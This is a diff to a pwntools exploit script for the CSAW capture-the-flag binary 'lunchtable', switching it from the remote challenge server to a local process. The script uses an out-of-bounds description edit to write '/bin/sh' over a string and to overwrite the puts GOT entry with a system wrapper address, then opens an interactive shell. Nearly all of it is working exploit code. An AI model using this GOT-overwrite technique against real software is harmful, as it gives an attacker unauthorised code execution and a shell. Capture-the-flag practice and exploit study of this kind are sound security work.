@@ -1,36 +1,38 @@
+#!/usr/bin/env python3
 from pwn import *
 
-# r = process('./lunchtable')
-r = remote('pwn.chal.csaw.io', 1001)
+elf = ELF('./lunchtable')
+p = elf.process()
+# p = remote('pwn.chal.csaw.io', 1001)
 
-system_wrapper = 0x40085c
+system_wrapper = elf.symbols['system_wrapper']
 
-r.recvuntil('What\'s your name?')
-r.sendline('A')
+p.recvuntil('What\'s your name?')
+p.sendline('A')
 
-r.recvuntil('Describe yourself, we want to know if you\'ll fit at our table...\n')
-r.sendline('A')
+p.recvuntil('Describe yourself, we want to know if you\'ll fit at our table...\n')
+p.sendline('A')
 
-r.recvuntil('Do you want to edit your description? (y/n): ')
-r.sendline('y')
+p.recvuntil('Do you want to edit your description? (y/n): ')
+p.sendline('y')
 
-r.recvuntil('What do you want to change?')
-r.sendline('32') # 0x6010c0 (goodbye) - 0x6010a0 (buffer) = 32 (decimal)
+p.recvuntil('What do you want to change?')
+p.sendline('32') # 0x6010c0 (goodbye) - 0x6010a0 (buffer) = 32 (decimal)
 
-r.recvuntil('Give me something to replace that with')
-r.sendline('/bin/sh')
+p.recvuntil('Give me something to replace that with')
+p.sendline('/bin/sh')
 
-r.recvuntil('Do you want to edit your description? (y/n): ')
-r.sendline('y')
+p.recvuntil('Do you want to edit your description? (y/n): ')
+p.sendline('y')
 
-r.recvuntil('What do you want to change?')
-r.sendline('-136') # 0x601018 (puts.got) - 0x6010a0 (buffer) = -136 (decimal)
+p.recvuntil('What do you want to change?')
+p.sendline('-136') # 0x601018 (puts.got) - 0x6010a0 (buffer) = -136 (decimal)
 
-r.recvuntil('Give me something to replace that with')
-r.sendline(p64(system_wrapper))
+p.recvuntil('Give me something to replace that with')
+p.sendline(p64(system_wrapper))
 
-r.recvuntil('Do you want to edit your description? (y/n): ')
-r.sendline('n')
+p.recvuntil('Do you want to edit your description? (y/n): ')
+p.sendline('n')
 
-r.interactive()
-r.close()
+p.interactive()
+p.close()
